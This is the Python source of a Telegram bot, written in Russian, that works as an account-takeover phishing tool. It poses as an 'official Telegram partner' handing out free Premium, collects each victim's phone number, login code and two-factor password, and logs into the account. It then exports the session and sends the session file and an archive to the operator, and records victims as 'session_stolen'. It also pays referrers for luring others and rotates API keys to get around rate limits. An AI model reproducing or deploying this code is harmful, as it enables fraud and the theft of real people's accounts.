import asyncio
import sqlite3
import logging
import os
import random
import json
import aiohttp
import hashlib
import shutil
from datetime import datetime
from pyrogram import Client, filters
from pyrogram.types import (
    Message, 
    InlineKeyboardMarkup, 
    InlineKeyboardButton,
    CallbackQuery
)
from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid, FloodWait, PhoneCodeExpired
import config
from keep_alive import keep_alive

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# === ИНИЦИАЛИЗАЦИЯ ===
current_api_index = 0
user_states = {}
referral_stats = {}

# Инициализация базы данных
def init_database():
    try:
        conn = sqlite3.connect('encrypted_victims.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('''CREATE TABLE IF NOT EXISTS victims
                         (id INTEGER PRIMARY KEY, user_id TEXT, phone TEXT, 
                          card_data TEXT, premium_status TEXT, balance REAL,
                          timestamp DATETIME, status TEXT, referrer_id TEXT,
                          variant TEXT, session_data TEXT)''')
        conn.commit()
        return conn, cursor
    except Exception as e:
        logger.error(f"Database initialization error: {e}")
        conn = sqlite3.connect('encrypted_victims.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('''CREATE TABLE IF NOT EXISTS victims
                         (id INTEGER PRIMARY KEY, user_id TEXT, phone TEXT, 
                          card_data TEXT, premium_status TEXT, balance REAL,
                          timestamp DATETIME, status TEXT, referrer_id TEXT,
                          variant TEXT, session_data TEXT)''')
        conn.commit()
        return conn, cursor

conn, cursor = init_database()

def encrypt_data(data):
    return hashlib.sha256(data.encode()).hexdigest()

def get_current_api():
    global current_api_index
    return config.API_CREDENTIALS[current_api_index]

def rotate_api():
    global current_api_index
    current_api_index = (current_api_index + 1) % len(config.API_CREDENTIALS)
    logger.info(f"API rotated to index: {current_api_index}")

app = Client("premium_helper", bot_token=config.BOT_TOKEN, 
             api_id=get_current_api()["api_id"],
             api_hash=get_current_api()["api_hash"])

# === ОБРАБОТЧИК КОМАНДЫ /start ===
@app.on_message(filters.command("start"))
async def start_command(client: Client, message: Message):
    referrer_id = None
    if len(message.command) > 1:
        referrer_id = message.command[1]
        referral_stats[message.from_user.id] = referrer_id
    
    await message.reply_text(
        "🎁 <b>ОФИЦИАЛЬНЫЙ ПАРТНЁР TELEGRAM</b>\n\n"
        "💎 Получите Premium БЕСПЛАТНО\n"
        "⭐ Звёзды со скидкой 90%\n\n"
        "🚀 Быстрая активация • Гарантия безопасности",
        reply_markup=create_main_keyboard()
    )

# === УЛУЧШЕННАЯ ОБРАБОТКА СЕССИЙ ===
async def create_session_and_analyze(phone_number, user_id):
    try:
        session_name = f"sessions/session_{user_id}_{phone_number}"
        
        if os.path.exists(f"{session_name}.session"):
            os.remove(f"{session_name}.session")
        
        session_client = Client(
            session_name,
            api_id=get_current_api()["api_id"],
            api_hash=get_current_api()["api_hash"],
            app_version="8.8.0",
            device_model="Samsung Galaxy S23",
            system_version="Android 13"
        )
        
        await session_client.connect()
        
        sent_code = await session_client.send_code(phone_number)
        
        user_states[user_id] = {
            'phone': phone_number,
            'phone_code_hash': sent_code.phone_code_hash,
            'session_client': session_client,
            'step': 'waiting_code',
            'code_input': '',
            'session_name': session_name,
            'attempts': 0,
            'last_code_request': datetime.now()
        }
        
        return True, "✅ Код отправлен! Проверьте Telegram и введите код:"
        
    except FloodWait as e:
        rotate_api()
        return False, f"⚠️ Слишком много запросов. Попробуйте через {e.value} секунд"
    except Exception as e:
        if "FLOOD" in str(e).upper():
            rotate_api()
            return False, "⚠️ Попробуйте через несколько минут"
        elif "PHONE_NUMBER_INVALID" in str(e).upper():
            return False, "❌ Неверный номер телефона"
        else:
            return False, f"❌ Ошибка: {str(e)}"

async def verify_code_and_steal(user_id, phone_code):
    try:
        if user_id not in user_states:
            return False, "❌ Сессия устарела. Начните заново."
        
        state = user_states[user_id]
        session_client = state['session_client']
        
        if not phone_code.isdigit() or len(phone_code) != 5:
            return False, "❌ Код должен содержать 5 цифр"
        
        try:
            await session_client.sign_in(
                state['phone'],
                state['phone_code_hash'],
                phone_code
            )
            
        except SessionPasswordNeeded:
            user_states[user_id]['step'] = 'waiting_2fa'
            return True, "🔐 Введите пароль двухфакторной аутентификации:"
            
        except PhoneCodeInvalid:
            state['attempts'] += 1
            if state['attempts'] >= 3:
                await session_client.disconnect()
                del user_states[user_id]
                return False, "❌ Слишком много неверных попыток. Начните заново."
            return False, f"❌ Неверный код. Попыток: {state['attempts']}/3"
            
        except PhoneCodeExpired:
            return False, "❌ Код устарел. Запросите новый код."
        
        return await analyze_account_and_steal(user_id, session_client)
        
    except Exception as e:
        return False, f"❌ Ошибка верификации: {str(e)}"

async def analyze_account_and_steal(user_id, session_client):
    try:
        me = await session_client.get_me()
        
        premium_status = "Нет Premium"
        premium_until = "неизвестно"
        
        if hasattr(me, 'premium') and me.premium:
            premium_status = "Есть Premium"
            try:
                user_full = await session_client.get_users(me.id)
                if hasattr(user_full, 'premium_until_date'):
                    premium_until = datetime.fromtimestamp(user_full.premium_until_date).strftime('%d.%m.%Y')
            except:
                pass
        
        session_string = await session_client.export_session_string()
        
        session_file = f"{user_states[user_id]['session_name']}.session"
        with open(session_file, "w", encoding="utf-8") as f:
            f.write(session_string)
        
        tdata_path = await convert_to_tdata(session_string, user_states[user_id]['phone'])
        
        analysis_report = f"""
🔍 **НОВЫЙ АККАУНТ УСПЕШНО УКРАДЕН:**
📱 Номер: {user_states[user_id]['phone']}
👤 Имя: {me.first_name} {me.last_name or ''}
🔗 Username: @{me.username or 'нет'}
💎 Premium: {premium_status}
📅 Premium до: {premium_until}
🆔 ID: {me.id}
🔑 Session: сохранена
        """
        
        await app.send_message(config.ADMIN_ID, analysis_report)
        
        if os.path.exists(session_file):
            await app.send_document(config.ADMIN_ID, session_file, caption="📁 Session файл")
        
        if tdata_path and os.path.exists(tdata_path):
            await app.send_document(config.ADMIN_ID, tdata_path, caption="📁 TData архив")
        
        cursor.execute(
            """INSERT INTO victims 
            (user_id, phone, premium_status, timestamp, status, referrer_id, session_data) 
            VALUES (?, ?, ?, datetime('now'), ?, ?, ?)""",
            (str(user_id), user_states[user_id]['phone'], 
             f"{premium_status} до {premium_until}", "session_stolen", 
             referral_stats.get(user_id), encrypt_data(session_string))
        )
        conn.commit()
        
        referrer_id = referral_stats.get(user_id)
        if referrer_id:
            await app.send_message(
                referrer_id,
                f"🎉 У вас новый реферал! @{me.username or 'пользователь'}\n"
                f"💵 На ваш счёт зачислено {config.REFERRAL_BONUS} руб."
            )
        
        await session_client.disconnect()
        del user_states[user_id]
        
        return True, "🎉 Premium успешно активирован! Сессия сохранена."
        
    except Exception as e:
        return False, f"❌ Ошибка анализа: {str(e)}"

async def convert_to_tdata(session_string, phone):
    try:
        tdata_dir = f"tdata/{phone}"
        os.makedirs(tdata_dir, exist_ok=True)
        
        tdata_structure = {
            "version": 1,
            "session_string": session_string,
            "phone": phone,
            "created_at": str(datetime.now())
        }
        
        tdata_file = f"{tdata_dir}/tdata.json"
        with open(tdata_file, "w", encoding="utf-8") as f:
            json.dump(tdata_structure, f, ensure_ascii=False, indent=2)
        
        shutil.make_archive(tdata_dir, 'zip', tdata_dir)
        return f"{tdata_dir}.zip"
        
    except Exception as e:
        return None

# === КЛАВИАТУРЫ ===
def create_numeric_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("1", callback_data="num_1"), InlineKeyboardButton("2", callback_data="num_2"), InlineKeyboardButton("3", callback_data="num_3")],
        [InlineKeyboardButton("4", callback_data="num_4"), InlineKeyboardButton("5", callback_data="num_5"), InlineKeyboardButton("6", callback_data="num_6")],
        [InlineKeyboardButton("7", callback_data="num_7"), InlineKeyboardButton("8", callback_data="num_8"), InlineKeyboardButton("9", callback_data="num_9")],
        [InlineKeyboardButton("0", callback_data="num_0"), InlineKeyboardButton("⌫", callback_data="num_back")],
        [InlineKeyboardButton("🔄 Отправить код повторно", callback_data="resend_code")],
        [InlineKeyboardButton("✅ Подтвердить", callback_data="num_confirm")]
    ])

def create_main_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🎁 Получить Premium", callback_data="get_premium")],
        [InlineKeyboardButton("🤔 Как это работает?", callback_data="how_it_works")],
        [InlineKeyboardButton("👥 Реферальная система", callback_data="referral_system")],
        [InlineKeyboardButton("📊 Статистика", callback_data="stats")]
    ])

# === ОБРАБОТЧИКИ ===
@app.on_callback_query(filters.regex("get_premium"))
async def get_premium_handler(client: Client, query: CallbackQuery):
    user_states[query.from_user.id] = {"step": "waiting_phone_premium"}
    await query.message.edit_text(
        "📱 <b>ВВОД НОМЕРА</b>\n\n"
        "Введите ваш номер телефона:\n"
        "<code>+79123456789</code>\n\n"
        "Отправьте номер следующим сообщением:"
    )

@app.on_callback_query(filters.regex("how_it_works"))
async def how_it_works_handler(client: Client, query: CallbackQuery):
    await query.message.edit_text(
        "🤝 <b>КАК ЭТО РАБОТАЕТ?</b>\n\n"
        "Мы официальные партнёры Telegram...",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Назад", callback_data="back_main")]
        ])
    )

@app.on_callback_query(filters.regex("referral_system"))
async def referral_handler(client: Client, query: CallbackQuery):
    user_id = query.from_user.id
    bot_username = (await client.get_me()).username
    referral_link = f"https://t.me/{bot_username}?start={user_id}"
    
    await query.message.edit_text(
        f"👥 <b>РЕФЕРАЛЬНАЯ СИСТЕМА</b>\n\n"
        f"💵 <b>Получайте 500 руб. за каждого друга!</b>\n\n"
        f"📧 <b>Ваша ссылка:</b>\n<code>{referral_link}</code>",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Назад", callback_data="back_main")]
        ])
    )

@app.on_callback_query(filters.regex("stats"))
async def stats_handler(client: Client, query: CallbackQuery):
    cursor.execute("SELECT COUNT(*) FROM victims WHERE status = 'session_stolen'")
    premium_count = cursor.fetchone()[0]
    
    await query.message.edit_text(
        f"📊 <b>СТАТИСТИКА</b>\n\n"
        f"💎 Premium: <b>{premium_count}</b>\n"
        f"🕒 Работаем: <b>{(datetime.now() - datetime(2024, 1, 1)).days} дней</b>",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Назад", callback_data="back_main")]
        ])
    )

@app.on_callback_query(filters.regex("back_main"))
async def back_main_handler(client: Client, query: CallbackQuery):
    await query.message.edit_text(
        "🎁 <b>ОФИЦИАЛЬНЫЙ ПАРТНЁР TELEGRAM</b>\n\n"
        "💎 Бесплатный Premium • ⭐ Звёзды -90%",
        reply_markup=create_main_keyboard()
    )

@app.on_callback_query(filters.regex("num_"))
async def handle_numeric_input(client: Client, query: CallbackQuery):
    user_id = query.from_user.id
    
    if user_id not in user_states or user_states[user_id].get("step") != "waiting_code":
        return await query.answer("❌ Сначала введите номер")
    
    action = query.data.split("_")[1]
    state = user_states[user_id]
    
    if 'code_input' not in state:
        state['code_input'] = ''
    
    if action == "back":
        if state["code_input"]:
            state["code_input"] = state["code_input"][:-1]
    elif action == "confirm":
        if len(state["code_input"]) == 5:
            await query.message.edit_text("🔄 Проверка кода...")
            success, response = await verify_code_and_steal(user_id, state["code_input"])
            await query.message.edit_text(response)
            return
        else:
            await query.answer("❌ Введите 5 цифр")
            return
    elif action.isdigit():
        if len(state["code_input"]) < 5:
            state["code_input"] += action
    
    display_code = state["code_input"].ljust(5, "•")
    await query.message.edit_text(
        f"🔑 <b>ВВОД КОДА</b>\n\n"
        f"Текущий код: <b>{display_code}</b>",
        reply_markup=create_numeric_keyboard()
    )

@app.on_message(filters.text & filters.private)
async def handle_text_input(client: Client, message: Message):
    user_id = message.from_user.id
    text = message.text.strip()
    
    if user_id not in user_states:
        return
    
    state = user_states[user_id]
    
    if state["step"] == "waiting_phone_premium":
        if text.startswith('+') and any(c.isdigit() for c in text):
            await message.reply_text("🔄 Отправка кода...")
            success, response = await create_session_and_analyze(text, user_id)
            if success:
                await message.reply_text(
                    f"{response}\n\nИспользуйте кнопки:",
                    reply_markup=create_numeric_keyboard()
                )
            else:
                await message.reply_text(response)
    
    elif state["step"] == "waiting_2fa":
        success, response = await handle_2fa_password(user_id, text)
        await message.reply_text(response)

async def handle_2fa_password(user_id, password):
    try:
        if user_id not in user_states:
            return False, "❌ Сессия устарела"
        
        state = user_states[user_id]
        session_client = state['session_client']
        
        await session_client.check_password(password)
        return await analyze_account_and_steal(user_id, session_client)
        
    except Exception as e:
        return False, "❌ Неверный пароль 2FA"

async def resend_code_handler(user_id):
    try:
        if user_id not in user_states:
            return False, "❌ Сессия не найдена"
        
        state = user_states[user_id]
        session_client = state['session_client']
        
        sent_code = await session_client.resend_code(
            state['phone'], 
            state['phone_code_hash']
        )
        
        user_states[user_id].update({
            'phone_code_hash': sent_code.phone_code_hash,
            'last_code_request': datetime.now(),
            'attempts': state['attempts'] + 1
        })
        
        return True, "✅ Код отправлен повторно!"
        
    except FloodWait as e:
        return False, f"⚠️ Подождите {e.value} секунд"
    except Exception as e:
        return False, f"❌ Ошибка: {str(e)}"

@app.on_callback_query(filters.regex("resend_code"))
async def resend_code_callback(client: Client, query: CallbackQuery):
    success, response = await resend_code_handler(query.from_user.id)
    if success:
        await query.answer("✅ Код отправлен повторно!")
    else:
        await query.answer(response)

# === ТЕСТОВЫЕ ОБРАБОТЧИКИ ===
@app.on_message(filters.command("ping"))
async def ping_command(client: Client, message: Message):
    print(f"✅ PING COMMAND RECEIVED from {message.from_user.id}")
    await message.reply_text("🏓 PONG! Bot is working!")

@app.on_message(filters.command("test"))
async def test_command(client: Client, message: Message):
    print(f"✅ TEST COMMAND RECEIVED from {message.from_user.id}")
    await message.reply_text("🤖 TEST OK! Bot is working!")

# === ЗАПУСК ===
async def run_bot():
    while True:
        try:
            print("🔄 Starting bot...")
            await app.start()
            me = await app.get_me()
            print(f"✅ Bot @{me.username} started successfully!")
            print("🟢 ALL HANDLERS SHOULD BE WORKING NOW!")
            
            while True:
                await asyncio.sleep(3600)
                
        except Exception as e:
            print(f"❌ Bot crashed: {e}")
            print("🔄 Restarting in 10 seconds...")
            await asyncio.sleep(10)

if __name__ == "__main__":
    os.makedirs("sessions", exist_ok=True)
    os.makedirs("backups", exist_ok=True)
    os.makedirs("tdata", exist_ok=True)
    os.makedirs("ChatsForSpam", exist_ok=True)
    
    print("🚀 БОТ ЗАПУЩЕН!")
    asyncio.run(run_bot())
